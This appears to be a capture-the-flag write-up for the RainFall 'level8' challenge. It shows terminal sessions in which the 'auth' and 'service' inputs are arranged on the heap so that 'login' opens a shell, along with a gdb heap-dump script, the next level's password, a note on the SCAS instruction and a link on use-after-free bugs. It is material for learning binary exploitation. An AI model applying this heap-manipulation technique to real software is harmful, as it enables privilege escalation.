
```
level8@RainFall:~$ objdump -t level8 | grep bss
08049aac   auth
08049ab0   service
```
```
level8@RainFall:~$ ./level8
(nil), (nil)
auth
(nil), (nil)
service
(nil), 0x804a008
reset
(nil), 0x804a008
login
Segmentation fault (core dumped)
```

```
auth AAAAAA
0x804a008, (nil)
service 1111
0x804a008, 0x804a018
service 1111
0x804a008, 0x804a028
login
$ pwd
/home/user/level8
```

```
level8@RainFall:~$ ./level8
(nil), (nil)
auth aaa
0x804a008, (nil)
service jjjjjjjjjjjjjjjjjjjjjjjjjjjj
0x804a008, 0x804a018
login
$ pwd
/home/user/level8
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

```
set hei 0
set pag off
define hook-stop
x/20wx 0x0804a000
echo ------------[service] -----------------\n
x/s service
echo ------------[auth] --------------------\n
x/s auth
echo ------------[auth+32] -----------------\n
x/s auth+0x20
echo ---------------------------------------\n
continue
end
```

```
(gdb) c
Continuing.
(nil), (nil)
auth AAAA
0x804a008, (nil)
serviceBBBBBBBBBBBBBBBB
0x804a008, 0x804a018
^C
Program received signal SIGINT, Interrupt.
0x804a000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804a010:      0x00000000      0x00000019      0x42424242      0x42424242
0x804a020:      0x42424242      0x42424242      0x0000000a      0x00020fd9
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
------------[service] -----------------
0x804a018:       'B' <repeats 16 times>, "\n"
0x804a018:       'B' <repeats 16 times>, "\n"
------------[auth] --------------------
0x804a008:       "AAAA\n"
0x804a008:       "AAAA\n"
------------[auth+32] -----------------
0x804a028:       "\n"
---------------------------------------
login
$ pwd
/home/user/level8
```

The SCAS instruction is used to scan a string (SCAS = SCan A String).
It compares the content of the accumulator (AL, AX, or EAX) against the current value pointed at by ES:[EDI].

When used together with the REPNE prefix (REPeat while Not Equal), 
SCAS scans the string searching for the first string element which is equal to the value in the accumulator. 


**Assembly commentary**
`check source section`

 Use-After-Free (UAF)  Vulnerabilities https://youtu.be/ZHghwsTRyzQ?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
